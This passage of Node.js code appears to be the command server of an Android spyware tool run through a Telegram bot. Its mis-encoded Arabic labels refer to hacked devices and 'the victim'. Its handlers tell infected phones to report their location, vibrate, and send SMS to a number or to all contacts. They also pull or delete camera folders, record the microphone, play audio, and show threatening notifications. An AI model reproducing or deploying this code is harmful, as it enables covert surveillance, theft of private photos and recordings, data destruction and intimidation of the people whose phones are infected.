                    "keyboard": [["ÙØ­Øµ Ø§ÙØ§Ø¬ÙØ²Ù Ø§ÙÙØ®ØªØ±ÙÙ"], ["Ø§Ø¸ÙØ§Ø± Ø§ÙØ§ÙØ± Ø§ÙØ§Ø®ØªØ±Ø§Ù"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'location') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('location');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'Â°â¢ Ø¬Ø§Ø±Ù ØªÙÙÙØ° Ø§ÙØ¹ÙÙÙÙ\n\n' +
            'â¢ Ø§ÙØªØ¸Ø± Ø¨Ø¹Ø¶ Ø§ÙÙÙØª',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ÙØ­Øµ Ø§ÙØ§Ø¬ÙØ²Ù Ø§ÙÙØ®ØªØ±ÙÙ"], ["Ø§Ø¸ÙØ§Ø± Ø§ÙØ§ÙØ± Ø§ÙØ§Ø®ØªØ±Ø§Ù"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'vibrate') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('vibrate');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'Â°â¢ Ø¬Ø§Ø±Ù ØªÙÙÙØ° Ø§ÙØ¹ÙÙÙÙ\n\n' +
            'â¢ Ø§ÙØªØ¸Ø± Ø¨Ø¹Ø¶ Ø§ÙÙÙØª',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ÙØ­Øµ Ø§ÙØ§Ø¬ÙØ²Ù Ø§ÙÙØ®ØªØ±ÙÙ"], ["Ø§Ø¸ÙØ§Ø± Ø§ÙØ§ÙØ± Ø§ÙØ§Ø®ØªØ±Ø§Ù"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'stop_audio') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('stop_audio');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'Â°â¢ Ø¬Ø§Ø±Ù ØªÙÙÙØ° Ø§ÙØ¹ÙÙÙÙ\n\n' +
            'â¢ Ø§ÙØªØ¸Ø± Ø¨Ø¹Ø¶ Ø§ÙÙÙØª',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ÙØ­Øµ Ø§ÙØ§Ø¬ÙØ²Ù Ø§ÙÙØ®ØªØ±ÙÙ"], ["Ø§Ø¸ÙØ§Ø± Ø§ÙØ§ÙØ± Ø§ÙØ§Ø®ØªØ±Ø§Ù"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'send_message') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, 'Â°â¢ Ø§ÙØªØ¨ Ø±ÙÙ ÙØ£Ø±Ø³Ø§Ù Ø±Ø³Ø§ÙØ© sms ÙÙ Ø¬ÙØ§Ø² Ø§ÙØ¶Ø­ÙÙ\n\n' +
            'â¢ Ø§ÙØªØ¨ Ø±ÙÙ ÙØ§ØªÙ ÙØ£Ø±Ø³Ø§Ù ÙÙ Ø±Ø³Ø§ÙÙ ÙØ±Ø¬Ù ÙØªØ§Ø¨Ø© Ø§ÙØ±ÙÙ ÙØªØ¨ÙØ¹Ø§ Ø¨ÙØ¯Ø§Ø¡ Ø§ÙØ¯ÙÙÙ',
            {reply_markup: {force_reply: true}})
        currentUuid = uuid
    }
    if (commend == 'send_message_to_all') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'Â°â¢ Ø§ÙØªØ¨ Ø±Ø³Ø§ÙÙ ÙØ£Ø±Ø³Ø§ÙÙØ§ ÙØ¬ÙÙØ¹ Ø¬ÙØ§Øª Ø§ØªØµØ§Ù Ø§ÙØ¶Ø­ÙÙ\n\n' +
            'â¢ ÙØ¬Ø¨ Ø§Ø¹Ø·Ø§Ø¡ Ø§ÙØ§Ø°Ù ÙÙ Ø§ÙØªØ·Ø¨ÙÙ Ø­ØªÙ ØªÙØ¬Ø­ ÙØ¹Ù',
            {reply_markup: {force_reply: true}}
        )
        currentUuid = uuid
    }
    if (commend == 'file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'Â°â¢ Ø§ÙØªØ¨ ÙØ³Ø§Ø± ÙØ¬ÙØ¯ ÙØªØ­ÙÙÙ ÙØ§ Ø¨Ø¯Ø§Ø®ÙÙ\n\n' +
            'â¢ Ø§ÙØªØ¨ ÙØ³Ø§Ø± ÙØ¬ÙØ¯ ð ÙØªØ­ÙÙÙ ÙØ§ Ø¨Ø¯Ø§Ø®ÙÙ ÙØ«Ø§Ù <b> DCIM/Camera </b> Ø³ÙØªÙ Ø³Ø­Ø¨ Ø§ÙØµÙØ±.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'delete_file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'Â°â¢ Ø§ÙØªØ¨ ÙØ³Ø§Ø± ÙÙÙ ÙØ­Ø°ÙÙ\n\n' +
            'â¢ Ø§ÙØªØ¨ Ø§Ù ÙØ³Ø§Ø± ÙØ«Ø§Ù <b> DCIM/Camera </b> Ø³ÙØªÙ Ø­Ø°Ù ÙØ§ Ø¨Ø¯Ø§Ø®ÙÙ.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'microphone') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'Â°â¢ ØªØ³Ø¬ÙÙ ØµÙØª Ø§ÙØ¶Ø­ÙÙ\n\n' +
            'â¢ Ø§ÙØªØ¨ ÙØ¯Ø© ØªØ³Ø¬ÙÙ Ø§ÙØ±ÙÙÙØ±Ø¯ Ø¨Ø§ÙØ«ÙØ§ÙÙ',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'toast') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'Â°â¢Ø§ÙØªØ¨ Ø±Ø³Ø§ÙÙ ÙØ£Ø¸ÙØ§Ø±ÙØ§ Ø¨ÙÙØªØµÙ Ø§ÙØ´Ø§Ø´Ù\n\n' +
            'â¢ Ø³ÙØªÙ Ø§Ø¸ÙØ§Ø± Ø§ÙØ±Ø³Ø§ÙÙ Ø¨ÙØµÙ Ø´Ø§Ø´Ø© Ø§ÙØ¶Ø­ÙÙ',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'show_notification') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'Â°â¢ Ø§ÙØªØ¨ Ø§Ø´Ø¹Ø§Ø± ØªÙØ¯ÙØ¯ ÙÙØ¶Ø­ÙÙ\n\n' +
            'â¢ Ø³ÙØªÙ Ø§Ø±Ø³Ø§Ù Ø§ÙØ§Ø´Ø¹Ø§Ø± Ø¨Ø´Ø±ÙØ· Ø§ÙØ§Ø´Ø¹Ø§Ø±Ø§Øª',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'play_audio') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'Â°â¢ Ø§Ø±Ø³Ù Ø±Ø§Ø¨Ø· Ø§ÙÙÙØ³ÙÙÙ\n\n' +
            'â¢ ÙÙØ­ÙØ¸Ù::  ÙØ¬Ø¨ Ø§Ù ÙÙÙÙ Ø±Ø§Ø¨Ø· ØªØ´ØºÙÙ ÙØ¨Ø§Ø´Ø±',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
});
setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping')
    });
    try {
        axios.get(address).then(r => "")
    } catch (e) {
    }
}, 5000)
appServer.listen(process.env.PORT || 8999);
